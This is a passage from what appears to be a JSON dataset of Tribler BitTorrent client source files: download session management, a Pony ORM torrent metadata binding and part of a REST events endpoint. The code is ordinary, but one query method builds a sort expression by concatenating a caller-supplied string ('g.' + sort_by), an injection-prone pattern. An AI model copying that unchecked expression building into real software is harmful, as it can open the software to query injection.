BitcoinTestnetWallet(wallet_path)\n                self.wallets[btc_wallet.get_identifier()] = btc_wallet\n                self.wallets[btc_testnet_wallet.get_identifier()] = btc_testnet_wallet\n            except ImportError:\n                self._logger.error(\"bitcoinlib library cannot be found, Bitcoin wallet not available!\")\n\n        if self.session.config.get_chant_enabled():\n            channels_dir = os.path.join(self.session.config.get_chant_channels_dir())\n            database_path = os.path.join(self.session.config.get_state_dir(), 'sqlite', 'metadata.db')\n            self.mds = MetadataStore(database_path, channels_dir, self.session.trustchain_keypair)\n\n        if self.session.config.get_dummy_wallets_enabled():\n            # For debugging purposes, we create dummy wallets\n            dummy_wallet1 = DummyWallet1()\n            self.wallets[dummy_wallet1.get_identifier()] = dummy_wallet1\n\n            dummy_wallet2 = DummyWallet2()\n            self.wallets[dummy_wallet2.get_identifier()] = dummy_wallet2\n\n        if self.ipv8:\n            self.ipv8_start_time = time.time()\n            self.load_ipv8_overlays()\n            self.enable_ipv8_statistics()\n\n        tunnel_community_ports = self.session.config.get_tunnel_community_socks5_listen_ports()\n        self.session.config.set_anon_proxy_settings(2, (\"127.0.0.1\", tunnel_community_ports))\n\n        if self.session.config.get_libtorrent_enabled():\n            self.session.readable_status = STATE_START_LIBTORRENT\n            from Tribler.Core.Libtorrent.LibtorrentMgr import LibtorrentMgr\n            self.ltmgr = LibtorrentMgr(self.session)\n            self.ltmgr.initialize()\n            for port, protocol in self.upnp_ports:\n                self.ltmgr.add_upnp_mapping(port, protocol)\n\n        if self.session.config.get_chant_enabled():\n            self.gigachannel_manager = GigaChannelManager(self.session)\n            self.gigachannel_manager.start()\n\n        # add task for tracker checking\n        if self.session.config.get_torrent_checking_enabled():\n            self.session.readable_status = STATE_START_TORRENT_CHECKER\n            self.torrent_checker = TorrentChecker(self.session)\n            self.torrent_checker.initialize()\n\n        if self.api_manager:\n            self.session.readable_status = STATE_START_API_ENDPOINTS\n            self.api_manager.root_endpoint.start_endpoints()\n\n        if self.session.config.get_watch_folder_enabled():\n            self.session.readable_status = STATE_START_WATCH_FOLDER\n            self.watch_folder = WatchFolder(self.session)\n            self.watch_folder.start()\n\n        if self.session.config.get_credit_mining_enabled():\n            self.session.readable_status = STATE_START_CREDIT_MINING\n            from Tribler.Core.CreditMining.CreditMiningManager import CreditMiningManager\n            self.credit_mining_manager = CreditMiningManager(self.session)\n\n        if self.session.config.get_resource_monitor_enabled():\n            self.resource_monitor = ResourceMonitor(self.session)\n            self.resource_monitor.start()\n\n        if self.session.config.get_version_checker_enabled():\n            self.version_check_manager = VersionCheckManager(self.session)\n            self.version_check_manager.start()\n\n        self.session.set_download_states_callback(self.sesscb_states_callback)\n\n        if self.session.config.get_ipv8_enabled() and self.session.config.get_trustchain_enabled():\n            self.payout_manager = PayoutManager(self.trustchain_community, self.dht_community)\n\n        self.initComplete = True\n\n    def add(self, tdef, dscfg, pstate=None, setupDelay=0, hidden=False,\n            share_mode=False, checkpoint_disabled=False):\n        \"\"\" Called by any thread \"\"\"\n        d = None\n        with self.session_lock:\n            if not isinstance(tdef, TorrentDefNoMetainfo) and not tdef.is_finalized():\n                raise ValueError(\"TorrentDef not finalized\")\n\n            infohash = tdef.get_infohash()\n\n            # Create the destination directory if it does not exist yet\n            try:\n                if not os.path.isdir(dscfg.get_dest_dir()):\n                    os.makedirs(dscfg.get_dest_dir())\n            except OSError:\n                self._logger.error(\"Unable to create the download destination directory.\")\n\n            if dscfg.get_time_added() == 0:\n                dscfg.set_time_added(int(timemod.time()))\n\n            # Check if running or saved on disk\n            if infohash in self.downloads:\n                self._logger.info(\"Torrent already exists in the downloads. Infohash:%s\", infohash.encode('hex'))\n\n            from Tribler.Core.Libtorrent.LibtorrentDownloadImpl import LibtorrentDownloadImpl\n            d = LibtorrentDownloadImpl(self.session, tdef)\n\n            if pstate is None:  # not already resuming\n                pstate = self.load_download_pstate_noexc(infohash)\n                if pstate is not None:\n                    self._logger.debug(\"tlm: add: pstate is %s %s\",\n                                       pstate.get('dlstate', 'status'), pstate.get('dlstate', 'progress'))\n\n            # Store in list of Downloads, always.\n            self.downloads[infohash] = d\n            setup_deferred = d.setup(dscfg, pstate, wrapperDelay=setupDelay,\n                                     share_mode=share_mode, checkpoint_disabled=checkpoint_disabled)\n            setup_deferred.addCallback(self.on_download_handle_created)\n\n        return d\n\n    def on_download_handle_created(self, download):\n        \"\"\"\n        This method is called when the download handle has been created.\n        Immediately checkpoint the download and write the resume data.\n        \"\"\"\n        return download.checkpoint()\n\n    def remove(self, d, removecontent=False, removestate=True, hidden=False):\n        \"\"\" Called by any thread \"\"\"\n        out = None\n        with self.session_lock:\n            out = d.stop_remove(removestate=removestate, removecontent=removecontent)\n            infohash = d.get_def().get_infohash()\n            if infohash in self.downloads:\n                del self.downloads[infohash]\n\n        return out or succeed(None)\n\n    def get_downloads(self):\n        \"\"\" Called by any thread \"\"\"\n        with self.session_lock:\n            return self.downloads.values()  # copy, is mutable\n\n    def get_channel_downloads(self):\n        with self.session_lock:\n            return [download for download in self.downloads.values() if download.get_channel_download()]\n\n    def get_download(self, infohash):\n        \"\"\" Called by any thread \"\"\"\n        with self.session_lock:\n            return self.downloads.get(infohash, None)\n\n    def download_exists(self, infohash):\n        with self.session_lock:\n            return infohash in self.downloads\n\n    @inlineCallbacks\n    def update_download_hops(self, download, new_hops):\n        \"\"\"\n        Update the amount of hops for a specified download. This can be done on runtime.\n        \"\"\"\n        infohash = binascii.hexlify(download.tdef.get_infohash())\n        self._logger.info(\"Updating the amount of hops of download %s\", infohash)\n        pstate = download.get_persistent_download_config()\n        pstate.set('state', 'engineresumedata', (yield download.save_resume_data()))\n        yield self.session.remove_download(download)\n\n        # copy the old download_config and change the hop count\n        dscfg = download.copy()\n        dscfg.set_hops(new_hops)\n        # If the user wants to change the hop count to 0, don't automatically bump this up to 1 anymore\n        dscfg.set_safe_seeding(False)\n\n        self.session.start_download_from_tdef(download.tdef, dscfg, pstate=pstate)\n\n    def update_trackers(self, infohash, trackers):\n        \"\"\" Update the trackers for a download.\n        :param infohash: infohash of the torrent that needs to be updated\n        :param trackers: A list of tracker urls.\n        \"\"\"\n        dl = self.get_download(infohash)\n        old_def = dl.get_def() if dl else None\n\n        if old_def:\n            old_trackers = old_def.get_trackers_as_single_tuple()\n            new_trackers = list(set(trackers) - set(old_trackers))\n            all_trackers = list(old_trackers) + new_trackers\n\n            if new_trackers:\n                # Add new trackers to the download\n                dl.add_trackers(new_trackers)\n\n                # Create a new TorrentDef\n                if isinstance(old_def, TorrentDefNoMetainfo):\n                    new_def = TorrentDefNoMetainfo(old_def.get_infohash(), old_def.get_name(), dl.get_magnet_link())\n                else:\n                    metainfo = old_def.get_metainfo()\n                    if len(all_trackers) > 1:\n                        metainfo[\"announce-list\"] = [all_trackers]\n                    else:\n                        metainfo[\"announce\"] = all_trackers[0]\n                    new_def = TorrentDef.load_from_dict(metainfo)\n\n                # Set TorrentDef + checkpoint\n                dl.set_def(new_def)\n                dl.checkpoint()\n\n    #\n    # State retrieval\n    #\n    def stop_download_states_callback(self):\n        \"\"\"\n        Stop any download states callback if present.\n        \"\"\"\n        if self.is_pending_task_active(\"download_states_lc\"):\n            self.cancel_pending_task(\"download_states_lc\")\n\n    def set_download_states_callback(self, user_callback, interval=1.0):\n        \"\"\"\n        Set the download state callback. Remove any old callback if it's present.\n        \"\"\"\n        self.stop_download_states_callback()\n        self._logger.debug(\"Starting the download state callback with interval %f\", interval)\n        self.download_states_lc = self.register_task(\"download_states_lc\",\n                                                     LoopingCall(self._invoke_states_cb, user_callback))\n        self.download_states_lc.start(interval)\n\n    def _invoke_states_cb(self, callback):\n        \"\"\"\n        Invoke the download states callback with a list of the download states.\n        \"\"\"\n        dslist = []\n        for d in self.downloads.values():\n            d.set_moreinfo_stats(True in self.get_peer_list or d.get_def().get_infohash() in\n                                 self.get_peer_list)\n            ds = d.network_get_state(None)\n            dslist.append(ds)\n\n        def on_cb_done(new_get_peer_list):\n            self.get_peer_list = new_get_peer_list\n\n        return deferToThread(callback, dslist).addCallback(on_cb_done)\n\n    def sesscb_states_callback(self, states_list):\n        \"\"\"\n        This method is periodically (every second) called with a list of the download states of the active downloads.\n        \"\"\"\n        self.state_cb_count += 1\n\n        # Check to see if a download has finished\n        new_active_downloads = []\n        do_checkpoint = False\n        seeding_download_list = []\n\n        for ds in states_list:\n            state = ds.get_status()\n            download = ds.get_download()\n            tdef = download.get_def()\n            safename = tdef.get_name_as_unicode()\n            infohash = tdef.get_infohash()\n\n            if state == DLSTATUS_DOWNLOADING:\n                new_active_downloads.append(infohash)\n            elif state == DLSTATUS_STOPPED_ON_ERROR:\n                self._logger.error(\"Error during download: %s\", repr(ds.get_error()))\n                if self.download_exists(infohash):\n                    self.get_download(infohash).stop()\n                    self.session.notifier.notify(NTFY_TORRENT, NTFY_ERROR, infohash, repr(ds.get_error()))\n            elif state == DLSTATUS_SEEDING:\n                seeding_download_list.append({u'infohash': infohash,\n                                              u'download': download})\n\n                if infohash in self.previous_active_downloads:\n                    self.session.notifier.notify(NTFY_TORRENT, NTFY_FINISHED, infohash, safename)\n                    do_checkpoint = True\n                elif download.get_hops() == 0 and download.get_safe_seeding():\n                    # Re-add the download with anonymity enabled\n                    hops = self.session.config.get_default_number_hops()\n                    self.update_download_hops(download, hops)\n\n            # Check the peers of this download every five seconds and add them to the payout manager when\n            # this peer runs a Tribler instance\n            if self.state_cb_count % 5 == 0 and download.get_hops() == 0 and self.payout_manager:\n                for peer in download.get_peerlist():\n                    if peer[\"extended_version\"].startswith('Tribler'):\n                        self.payout_manager.update_peer(peer[\"id\"].decode('hex'), infohash, peer[\"dtotal\"])\n\n        self.previous_active_downloads = new_active_downloads\n        if do_checkpoint:\n            self.session.checkpoint_downloads()\n\n        if self.state_cb_count % 4 == 0:\n            if self.tunnel_community:\n                self.tunnel_community.monitor_downloads(states_list)\n            if self.credit_mining_manager:\n                self.credit_mining_manager.monitor_downloads(states_list)\n\n        return []\n\n    #\n    # Persistence methods\n    #\n    def load_checkpoint(self):\n        \"\"\" Called by any thread \"\"\"\n\n        def do_load_checkpoint():\n            with self.session_lock:\n                for i, filename in enumerate(iglob(os.path.join(self.session.get_downloads_pstate_dir(), '*.state'))):\n                    self.resume_download(filename, setupDelay=i * 0.1)\n\n        if self.initComplete:\n            do_load_checkpoint()\n        else:\n            self.register_task(\"load_checkpoint\", reactor.callLater(1, do_load_checkpoint))\n\n    def load_download_pstate_noexc(self, infohash):\n        \"\"\" Called by any thread, assume session_lock already held \"\"\"\n        try:\n            basename = binascii.hexlify(infohash) + '.state'\n            filename = os.path.join(self.session.get_downloads_pstate_dir(), basename)\n            if os.path.exists(filename):\n                return self.load_download_pstate(filename)\n            else:\n                self._logger.info(\"%s not found\", basename)\n\n        except Exception:\n            self._logger.exception(\"Exception while loading pstate: %s\", infohash)\n\n    def resume_download(self, filename, setupDelay=0):\n        tdef = dscfg = pstate = None\n\n        pstate = self.load_download_pstate(filename)\n\n        metainfo = pstate.get('state', 'metainfo')\n        if 'infohash' in metainfo:\n            tdef = TorrentDefNoMetainfo(metainfo['infohash'], metainfo['name'], metainfo.get('url', None))\n        else:\n            tdef = TorrentDef.load_from_dict(metainfo)\n\n        if pstate.has_option('download_defaults', 'saveas') and \\\n                isinstance(pstate.get('download_defaults', 'saveas'), tuple):\n            pstate.set('download_defaults', 'saveas', pstate.get('download_defaults', 'saveas')[-1])\n\n        dscfg = DownloadStartupConfig(pstate)\n\n        if pstate is not None:\n            has_resume_data = pstate.get('state', 'engineresumedata') is not None\n            self._logger.debug(\"tlm: load_checkpoint: resumedata %s\",\n                               'len %s ' % len(pstate.get('state', 'engineresumedata')) if has_resume_data else 'None')\n\n        if tdef and dscfg:\n            if dscfg.get_dest_dir() != '':  # removed torrent ignoring\n                try:\n                    if self.download_exists(tdef.get_infohash()):\n                        self._logger.info(\"tlm: not resuming checkpoint because download has already been added\")\n                    elif dscfg.get_credit_mining() and not self.session.config.get_credit_mining_enabled():\n                        self._logger.info(\"tlm: not resuming checkpoint since token mining is disabled\")\n                    else:\n                        self.add(tdef, dscfg, pstate, setupDelay=setupDelay)\n                except Exception as e:\n                    self._logger.exception(\"tlm: load check_point: exception while adding download %s\", tdef)\n            else:\n                self._logger.info(\"tlm: removing checkpoint %s destdir is %s\", filename, dscfg.get_dest_dir())\n                os.remove(filename)\n        else:\n            self._logger.info(\"tlm: could not resume checkpoint %s %s %s\", filename, tdef, dscfg)\n\n    def checkpoint_downloads(self):\n        \"\"\"\n        Checkpoints all running downloads in Tribler.\n        Even if the list of Downloads changes in the mean time this is no problem.\n        For removals, dllist will still hold a pointer to the download, and additions are no problem\n        (just won't be included in list of states returned via callback).\n        \"\"\"\n        downloads = self.downloads.values()\n        deferred_list = []\n        self._logger.debug(\"tlm: checkpointing %s downloads\", len(downloads))\n        for download in downloads:\n            deferred_list.append(download.checkpoint())\n\n        return DeferredList(deferred_list)\n\n    def shutdown_downloads(self):\n        \"\"\"\n        Shutdown all downloads in Tribler.\n        \"\"\"\n        for download in self.downloads.values():\n            download.stop()\n\n    def remove_pstate(self, infohash):\n        def do_remove():\n            if not self.download_exists(infohash):\n                dlpstatedir = self.session.get_downloads_pstate_dir()\n\n                # Remove checkpoint\n                hexinfohash = binascii.hexlify(infohash)\n                try:\n                    basename = hexinfohash + '.state'\n                    filename = os.path.join(dlpstatedir, basename)\n                    self._logger.debug(\"remove pstate: removing dlcheckpoint entry %s\", filename)\n                    if os.access(filename, os.F_OK):\n                        os.remove(filename)\n                except:\n                    # Show must go on\n                    self._logger.exception(\"Could not remove state\")\n            else:\n                self._logger.warning(\"remove pstate: download is back, restarted? Canceling removal! %s\",\n                                     repr(infohash))\n\n        reactor.callFromThread(do_remove)\n\n    @inlineCallbacks\n    def early_shutdown(self):\n        \"\"\" Called as soon as Session shutdown is initiated. Used to start\n        shutdown tasks that takes some time and that can run in parallel\n        to checkpointing, etc.\n        :returns a Deferred that will fire once all dependencies acknowledge they have shutdown.\n        \"\"\"\n        self._logger.info(\"tlm: early_shutdown\")\n\n        self.shutdown_task_manager()\n\n        # Note: session_lock not held\n        self.shutdownstarttime = timemod.time()\n        if self.credit_mining_manager:\n            self.session.notify_shutdown_state(\"Shutting down Credit Mining...\")\n            yield self.credit_mining_manager.shutdown()\n        self.credit_mining_manager = None\n\n        if self.torrent_checker:\n            self.session.notify_shutdown_state(\"Shutting down Torrent Checker...\")\n            yield self.torrent_checker.shutdown()\n        self.torrent_checker = None\n\n        if self.gigachannel_manager:\n            self.session.notify_shutdown_state(\"Shutting down Gigachannel Manager...\")\n            yield self.gigachannel_manager.shutdown()\n        self.gigachannel_manager = None\n\n        if self.video_server:\n            self.session.notify_shutdown_state(\"Shutting down Video Server...\")\n            yield self.video_server.shutdown_server()\n        self.video_server = None\n\n        if self.version_check_manager:\n            self.session.notify_shutdown_state(\"Shutting down Version Checker...\")\n            self.version_check_manager.stop()\n        self.version_check_manager = None\n\n        if self.resource_monitor:\n            self.session.notify_shutdown_state(\"Shutting down Resource Monitor...\")\n            self.resource_monitor.stop()\n        self.resource_monitor = None\n\n        self.tracker_manager = None\n\n        if self.tunnel_community and self.trustchain_community:\n            # We unload these overlays manually since the TrustChain has to be unloaded after the tunnel overlay.\n            tunnel_community = self.tunnel_community\n            self.tunnel_community = None\n            self.session.notify_shutdown_state(\"Unloading Tunnel Community...\")\n            yield self.ipv8.unload_overlay(tunnel_community)\n            trustchain_community = self.trustchain_community\n            self.trustchain_community = None\n            self.session.notify_shutdown_state(\"Shutting down TrustChain Community...\")\n            yield self.ipv8.unload_overlay(trustchain_community)\n\n        if self.ipv8:\n            self.session.notify_shutdown_state(\"Shutting down IPv8...\")\n            yield self.ipv8.stop(stop_reactor=False)\n\n        if self.channelcast_db is not None:\n            self.session.notify_shutdown_state(\"Shutting down ChannelCast DB...\")\n            yield self.channelcast_db.close()\n        self.channelcast_db = None\n\n        if self.votecast_db is not None:\n            self.session.notify_shutdown_state(\"Shutting down VoteCast DB...\")\n            yield self.votecast_db.close()\n        self.votecast_db = None\n\n        if self.mypref_db is not None:\n            self.session.notify_shutdown_state(\"Shutting down Preference DB...\")\n            yield self.mypref_db.close()\n        self.mypref_db = None\n\n        if self.torrent_db is not None:\n            self.session.notify_shutdown_state(\"Shutting down Torrent DB...\")\n            yield self.torrent_db.close()\n        self.torrent_db = None\n\n        if self.peer_db is not None:\n            self.session.notify_shutdown_state(\"Shutting down Peer DB...\")\n            yield self.peer_db.close()\n        self.peer_db = None\n\n        if self.watch_folder is not None:\n            self.session.notify_shutdown_state(\"Shutting down Watch Folder...\")\n            yield self.watch_folder.stop()\n        self.watch_folder = None\n\n    def network_shutdown(self):\n        try:\n            self._logger.info(\"tlm: network_shutdown\")\n\n            ts = enumerate_threads()\n            self._logger.info(\"tlm: Number of threads still running %d\", len(ts))\n            for t in ts:\n                self._logger.info(\"tlm: Thread still running=%s, daemon=%s, instance=%s\", t.getName(), t.isDaemon(), t)\n        except:\n            print_exc()\n\n        # Stop network thread\n        self.sessdoneflag.set()\n\n        # Shutdown libtorrent session after checkpoints have been made\n        if self.ltmgr is not None:\n            self.ltmgr.shutdown()\n            self.ltmgr = None\n\n    def save_download_pstate(self, infohash, pstate):\n        \"\"\" Called by network thread \"\"\"\n\n        self.downloads[infohash].pstate_for_restart = pstate\n\n        self.register_anonymous_task(\"save_pstate\", self.downloads[infohash].save_resume_data())\n\n    def load_download_pstate(self, filename):\n        \"\"\" Called by any thread \"\"\"\n        pstate = CallbackConfigParser()\n        pstate.read_file(filename)\n        return pstate\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/Tribler/Core/Modules/MetadataStore/OrmBindings/torrent_metadata.py",
        "source": "from __future__ import absolute_import\n\nfrom binascii import hexlify\nfrom datetime import datetime\n\nfrom pony import orm\nfrom pony.orm import db_session, desc, raw_sql, select\n\nfrom Tribler.Core.Category.FamilyFilter import default_xxx_filter\nfrom Tribler.Core.Modules.MetadataStore.OrmBindings.channel_node import LEGACY_ENTRY, TODELETE\nfrom Tribler.Core.Modules.MetadataStore.serialization import REGULAR_TORRENT, TorrentMetadataPayload\nfrom Tribler.Core.Utilities.tracker_utils import get_uniformed_tracker_url\nfrom Tribler.pyipv8.ipv8.database import database_blob\n\n\ndef define_binding(db):\n    class TorrentMetadata(db.ChannelNode):\n        _discriminator_ = REGULAR_TORRENT\n\n        # Serializable\n        infohash = orm.Required(database_blob)\n        size = orm.Optional(int, size=64, default=0)\n        torrent_date = orm.Optional(datetime, default=datetime.utcnow)\n        title = orm.Optional(str, default='')\n        tags = orm.Optional(str, default='')\n        tracker_info = orm.Optional(str, default='')\n\n        orm.composite_key(db.ChannelNode.public_key, infohash)\n\n        # Local\n        xxx = orm.Optional(float, default=0)\n        health = orm.Optional('TorrentState', reverse='metadata')\n\n        _payload_class = TorrentMetadataPayload\n\n        def __init__(self, *args, **kwargs):\n            if \"health\" not in kwargs and \"infohash\" in kwargs:\n                kwargs[\"health\"] = db.TorrentState.get(infohash=kwargs[\"infohash\"]) or db.TorrentState(\n                    infohash=kwargs[\"infohash\"])\n            if 'xxx' not in kwargs:\n                kwargs[\"xxx\"] = default_xxx_filter.isXXXTorrentMetadataDict(kwargs)\n\n            super(TorrentMetadata, self).__init__(*args, **kwargs)\n\n            if 'tracker_info' in kwargs:\n                self.add_tracker(kwargs[\"tracker_info\"])\n\n        def add_tracker(self, tracker_url):\n            sanitized_url = get_uniformed_tracker_url(tracker_url)\n            if sanitized_url:\n                tracker = db.TrackerState.get(url=sanitized_url) or db.TrackerState(url=sanitized_url)\n                self.health.trackers.add(tracker)\n\n        def before_update(self):\n            self.add_tracker(self.tracker_info)\n\n        def get_magnet(self):\n            return (\"magnet:?xt=urn:btih:%s&dn=%s\" %\n                    (str(self.infohash).encode('hex'), self.title)) + \\\n                   (\"&tr=%s\" % self.tracker_info if self.tracker_info else \"\")\n\n        @classmethod\n        def search_keyword(cls, query, lim=100):\n            # Requires FTS5 table \"FtsIndex\" to be generated and populated.\n            # FTS table is maintained automatically by SQL triggers.\n            # BM25 ranking is embedded in FTS5.\n\n            # Sanitize FTS query\n            if not query or query == \"*\":\n                return []\n\n            fts_ids = raw_sql(\n                'SELECT rowid FROM FtsIndex WHERE FtsIndex MATCH $query ORDER BY bm25(FtsIndex) LIMIT $lim')\n            return cls.select(lambda g: g.rowid in fts_ids)\n\n        @classmethod\n        def get_auto_complete_terms(cls, keyword, max_terms, limit=10):\n            if not keyword:\n                return []\n\n            with db_session:\n                result = cls.search_keyword(\"\\\"\" + keyword + \"\\\"*\", lim=limit)[:]\n            titles = [g.title.lower() for g in result]\n\n            # Copy-pasted from the old DBHandler (almost) completely\n            all_terms = set()\n            for line in titles:\n                if len(all_terms) >= max_terms:\n                    break\n                i1 = line.find(keyword)\n                i2 = line.find(' ', i1 + len(keyword))\n                term = line[i1:i2] if i2 >= 0 else line[i1:]\n                if term != keyword:\n                    all_terms.add(term)\n            return list(all_terms)\n\n        @classmethod\n        @db_session\n        def get_random_torrents(cls, limit):\n            \"\"\"\n            Return some random torrents from the database.\n            \"\"\"\n            return TorrentMetadata.select(\n                lambda g: g.metadata_type == REGULAR_TORRENT and g.status != LEGACY_ENTRY).random(limit)\n\n        @classmethod\n        @db_session\n        def get_entries_query(cls, sort_by=None, sort_asc=True, query_filter=None):\n            \"\"\"\n            Get some metadata entries. Optionally sort the results by a specific field, or filter the channels based\n            on a keyword/whether you are subscribed to it.\n            :return: A tuple. The first entry is a list of ChannelMetadata entries. The second entry indicates\n                     the total number of results, regardless the passed first/last parameter.\n            \"\"\"\n            # Warning! For Pony magic to work, iteration variable name (e.g. 'g') should be the same everywhere!\n            # Filter the results on a keyword or some keywords\n            pony_query = cls.search_keyword(query_filter, lim=1000) if query_filter else select(g for g in cls)\n\n            # Sort the query\n            if sort_by:\n                if sort_by == \"HEALTH\":\n                    pony_query = pony_query.sort_by(\"(g.health.seeders, g.health.leechers)\") if sort_asc else \\\n                        pony_query.sort_by(\"(desc(g.health.seeders), desc(g.health.leechers))\")\n                else:\n                    sort_expression = \"g.\" + sort_by\n                    sort_expression = sort_expression if sort_asc else desc(sort_expression)\n                    pony_query = pony_query.sort_by(sort_expression)\n            return pony_query\n\n\n        @classmethod\n        @db_session\n        def get_entries(cls, first=None, last=None, metadata_type=REGULAR_TORRENT, channel_pk=False,\n                        exclude_deleted=False, hide_xxx=False, **kwargs):\n            \"\"\"\n            Get some torrents. Optionally sort the results by a specific field, or filter the channels based\n            on a keyword/whether you are subscribed to it.\n            :return: A tuple. The first entry is a list of ChannelMetadata entries. The second entry indicates\n                     the total number of results, regardless the passed first/last parameter.\n            \"\"\"\n            pony_query = cls.get_entries_query(**kwargs)\n\n            if isinstance(metadata_type, list):\n                pony_query = pony_query.where(lambda g: g.metadata_type in metadata_type)\n            else:\n                pony_query = pony_query.where(metadata_type=metadata_type)\n\n            if exclude_deleted:\n                pony_query = pony_query.where(lambda g: g.status != TODELETE)\n            if hide_xxx:\n                pony_query = pony_query.where(lambda g: g.xxx == 0)\n\n            # Filter on channel\n            if channel_pk:\n                pony_query = pony_query.where(public_key=channel_pk)\n\n            count = pony_query.count()\n\n            return pony_query[(first or 1) - 1:last] if first or last else pony_query, count\n\n        @db_session\n        def to_simple_dict(self, include_trackers=False):\n            \"\"\"\n            Return a basic dictionary with information about the channel.\n            \"\"\"\n            simple_dict = {\n                \"id\": self.rowid,\n                \"name\": self.title,\n                \"infohash\": hexlify(self.infohash),\n                \"size\": self.size,\n                \"category\": self.tags,\n                \"num_seeders\": self.health.seeders,\n                \"num_leechers\": self.health.leechers,\n                \"last_tracker_check\": self.health.last_check,\n                \"status\": self.status\n            }\n\n            if include_trackers:\n                simple_dict['trackers'] = [tracker.url for tracker in self.health.trackers]\n\n            return simple_dict\n\n        def metadata_conflicting(self, b):\n            # Check if metadata in the given dict has conflicts with this entry\n            # WARNING! This does NOT check the INFOHASH\n            a = self.to_dict()\n            for comp in [\"title\", \"size\", \"tags\", \"torrent_date\", \"tracker_info\"]:\n                if (comp not in b) or (str(a[comp]) == str(b[comp])):\n                    continue\n                return True\n            return False\n\n    return TorrentMetadata\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/Tribler/Core/Modules/restapi/events_endpoint.py",
        "source": "from __future__ import absolute_import\n\nimport time\nfrom binascii import hexlify\n\nfrom twisted.web import resource, server\n\nimport Tribler.Core.Utilities.json_util as json\nfrom Tribler.Core.Modules.restapi.util import fix_unicode_dict\nfrom Tribler.Core.simpledefs import NTFY_CHANNEL, NTFY_CREDIT_MINING, NTFY_DISCOVERED, NTFY_ERROR, NTFY_FINISHED, \\\n    NTFY_INSERT, NTFY_MARKET_ON_ASK, NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID, NTFY_MARKET_ON_BID_TIMEOUT, \\\n    NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_MARKET_ON_PAYMENT_SENT, NTFY_MARKET_ON_TRANSACTION_COMPLETE, \\\n    NTFY_NEW_VERSION, NTFY_REMOVE, NTFY_STARTED, NTFY_TORRENT, NTFY_TRIBLER, NTFY_TUNNEL, NTFY_UPDATE, NTFY_UPGRADER, \\\n    NTFY_UPGRADER_TICK, NTFY_WATCH_FOLDER_CORRUPT_TORRENT, SIGNAL_LOW_SPACE, SIGNAL_RESOURCE_CHECK, STATE_SHUTDOWN\nfrom Tribler.Core.version import version_id\nfrom Tribler.pyipv8.ipv8.messaging.anonymization.tunnel import Circuit\n\n\nclass EventsEndpoint(resource.Resource):\n    \"\"\"\n    Important events in Tribler are returned over the events endpoint. This connection is held open. Each event is\n    pushed over this endpoint in the form of a JSON dictionary. Each JSON dictionary contains a type field that\n    indicates the type of the event. Individual events are separated by a newline character (\\n).\n\n    Currently, the following events are implemented:\n\n    - events_start: An indication that the event socket is opened and that the server is ready to push events. This\n      includes information about whether Tribler has started already or not and the version of Tribler used.\n    - search_result_channel: This event dictionary contains a search result with a channel that has been found.\n    - search_result_torrent: This event dictionary contains a search result with a torrent that has been found.\n    - upgrader_started: An indication that the Tribler upgrader has started.\n    - upgrader_finished: An indication that the Tribler upgrader has finished.\n    - upgrader_tick: An indication that the state of the upgrader has changed. The dictionary contains a human-readable\n      string with the new state.\n    - watch_folder_corrupt_torrent: This event is emitted when a corrupt .torrent file in the watch folder is found.\n      The dictionary contains the name of the corrupt torrent file.\n    - new_version_available: This event is emitted when a new version of Tribler is available.\n    - tribler_started: An indicator that Tribler has completed the startup procedure and is ready to use.\n    - channel_discovered: An indicator that Tribler has discovered a new channel. The event contains the name,\n      description and dispersy community id of the discovered channel.\n    - torrent_discovered: An indicator that Tribler has discovered a new torrent. The event contains the infohash, name,\n      list of trackers, list of files with name and size, and the dispersy community id of the discovered torrent.\n    - torrent_removed_from_channel: An indicator that a torrent has been removed from a channel. The event contains\n      the infohash and the dispersy id of the channel which contained the removed torrent.\n    - torrent_finished: A specific torrent has finished downloading. The event includes the infohash and name of the\n      torrent that has finished downloading.\n    - torrent_error: An error has occurred during the download process of a specific torrent. The event includes the\n      infohash and a readable string of the error message.\n    - tribler_exception: An exception has occurred in Tribler. The event includes a readable string of the error.\n    - market_ask: Tribler learned about a new ask in the market. The event includes information about the ask.\n    - market_bid: Tribler learned about a new bid in the market. The event includes information about the bid.\n    - market_ask_timeout: An ask has expired. The event includes information about the ask.\n    - market_bid_timeout: An bid has expired. The event includes information about the bid.\n    - market_transaction_complete: A transaction has been completed in the market. The event contains the transaction\n      that was completed.\n    - market_payment_received: We received a payment in the market. The events contains the payment information.\n    - market_payment_sent: We sent a payment in the market. The events contains the payment information.\n    - market_iom_input_required: The Internet-of-Money modules requires user input (like a password or challenge\n      response).\n    \"\"\"\n\n    def __init__(self, session):\n        resource.Resource.__init__(self)\n        self.session = session\n        self.events_requests = []\n\n        self.infohashes_sent = set()\n        self.channel_cids_sent = set()\n\n        self.session.add_observer(self.on_upgrader_started, NTFY_UPGRADER, [NTFY_STARTED])\n        self.session.add_observer(self.on_upgrader_finished, NTFY_UPGRADER, [NTFY_FINISHED])\n        self.session.add_observer(self.on_upgrader_tick, NTFY_UPGRADER_TICK, [NTFY_STARTED])\n        self.session.add_observer(self.on_watch_folder_corrupt_torrent,\n                                  NTFY_WATCH_FOLDER_CORRUPT_TORRENT, [NTFY_INSERT])\n        self.session.add_observer(self.on_new_version_available, NTFY_NEW_VERSION, [NTFY_INSERT])\n        self.session.add_observer(self.on_tribler_started, NTFY_TRIBLER, [NTFY_STARTED])\n        self.session.add_observer(self.on_channel_discovered, NTFY_CHANNEL, [NTFY_DISCOVERED])\n        self.session.add_observer(self.on_torrent_discovered, NTFY_TORRENT, [NTFY_DISCOVERED])\n        self.session.add_observer(self.on_torrent_finished, NTFY_TORRENT, [NTFY_FINISHED])\n        self.session.add_observer(self.on_torrent_error, NTFY_TORRENT, [NTFY_ERROR])\n        self.session.add_observer(self.on_torrent_info_updated, NTFY_TORRENT, [NTFY_UPDATE])\n        self.session.add_observer(self.on_market_ask, NTFY_MARKET_ON_ASK, [NTFY_UPDATE])\n        self.session.add_observer(self.on_market_bid, NTFY_MARKET_ON_BID, [NTFY_UPDATE])\n        self.session.add_observer(self.on_market_ask_timeout, NTFY_MARKET_ON_ASK_TIMEOUT, [NTFY_UPDATE])\n        self.session.add_observer(self.on_market_bid_timeout, NTFY_MARKET_ON_BID_TIMEOUT, [NTFY_UPDATE])\n        